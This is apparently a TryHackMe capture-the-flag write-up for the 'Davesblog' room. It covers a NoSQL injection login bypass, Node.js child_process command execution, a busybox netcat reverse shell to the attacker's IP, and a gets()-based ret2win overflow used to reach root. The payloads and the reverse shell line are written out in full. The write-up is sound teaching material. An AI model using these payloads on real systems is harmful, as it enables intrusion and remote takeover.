<h3> Davesblog TryHackMe </h3>

Difficulty = Hard

Nmap Scan:
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fe08f1e1-1816-4a36-8e3c-a5a65985d426)

Checking the web server shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e4d01c87-c206-417e-9cfa-1ec50bf94091)

From looking at the web app server builtins we can see this

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/699e3b64-a912-42dc-9981-f07f4bac6a09)

This tells us that the web server is running on Express which is basically NodeJS and also the db is NoSQL

Checking the /admin directory shows a login page
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f349a68b-2136-4aa8-af74-9e247ae4a70e)

Since we don't currently know any cred to use lets try NoSQLi 

I used [this](https://book.hacktricks.xyz/pentesting-web/nosql-injection) to get my payload to be:

```json
{"username": {"$ne": null}, "password": {"$ne": null} }
```

And remember the *Content-Type* should be set to *application/json*

Trying that bypasses the login form
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/046e84e9-57e8-481b-89f1-08b9b76bed54)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/66883af2-ca6e-41be-af4a-263eecd1a4de)

A new cookie is formed and its a jwt token 

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a7d75288-15ec-4e23-8793-f0cf70640399)

Using [jwt.io](https://jwt.io/) I decoded the jwt token and got the first flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9e97c9fe-1ad5-4a1a-883b-59e50e80d435)

There's a place which claims to be executing system commands but when i try execute normal commands it doesn't work
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/70d80988-4740-4c49-bbb8-0db576988e65)

Since we know that the web server is build on NodeJs lets execute a NodeJS command
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/98e7ddae-13d6-4554-9f14-c20c612adf99)

```js
(() => { return require("child_process").execSync("whoami;", { timeout: 5000 }); })();
```

Now lets get shell :D

```js
(() => { return require("child_process").execSync("busybox nc 10.2.42.156 1337 -e /bin/bash;", { timeout: 5000 }); })();
```

To stabilize the shell
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/79634295-3ecd-410c-932c-543f9a59b040)

For the next flag we need to interact with the MongoDB hosted locally 

We can check for internal service running on the host
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f2bca12e-0e7b-43a3-b2be-3a6d38039446)

Lets interact with the MongoDB from the target directly
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1267a39c-5188-4027-9579-aeaacabfeba8)

Let us escalate privilege to root now

Checking *sudo -l* shows we can run */uid_checker* as root
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ecb24c00-ad9c-4387-8297-4df0889b4f4f)

I downloaded the binary to my box for further analysis
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2d6c9d04-c0e6-4256-abc9-7eca510b77f3)

Basic file checks
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/250d9677-1334-4985-8fea-bee0b4091c93)

We're working with a x64 binary which is dynamically linked and not stripped and from the mitigation check we can see that only NX is enabled

Running strings on the binary gives the 4th flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b7c152fd-7fa9-46f8-a791-ec2a518e1be3)

Using ghidra I'll do dynamic analysis on the binary

Here's the decompiled main function

```c
void main(void)

{
  int option;
  char buf [72];
  __uid_t uid;
  __gid_t gid;
  
  puts("Welcome to the UID checker!\nEnter 1 to check your UID or enter 2 to check your GID");
  gets(buf);
  option = strcmp(buf,"1");
  if (option == 0) {
    uid = getuid();
    printf("Your UID is: %d\n",(ulong)uid);
  }
  else {
    option = strcmp(buf,"2");
    if (option == 0) {
      gid = getgid();
      printf("Your GID is: %d\n",(ulong)gid);
    }
    else {
      option = strcmp(buf,"THM{runn1ng_str1ngs_1s_b4sic4lly_RE}");
      if (option == 0) {
        puts("Wow! You found the secret function! I still need to finish it..");
      }
      else {
        puts("Invalid choice");
      }
    }
  }
  return;
}
```

Basically it's just a uid and gid checker but we're not interested in that 

We can spot the vulnerability that is the usage of gets() to receive our input

Looking through the function there's a secret function 

Here's it decompiled code

```c
void secret(void)

{
  puts("How did you get here???");
  system("/bin/sh");
  return;
}
```

With this we can tell this is just a ret2win sorta challenge 

All we need to do is to hijack the program execution then make the instruction pointer points to the secret function address

Lets get the offset
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/43eea022-4f96-4eff-b6d8-bfce95d2052d)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/ac6c7fec-e434-4331-b549-69b0807496bd)

Cool the offset is *88*. 

Here's my solve [script](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/thm/davesblog/solve.py)

Running it works locally and creates the payload file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/096b136b-77db-44b7-b60f-4c1422ce93c6)

I'll transfer the payload to the target
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8a4a1af4-dfcf-4922-8561-d1d325fb5102)

Running the payload on the binary gives shell as root
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/91247418-1de7-4bdf-9034-3661489175c5)

And we're done 👻
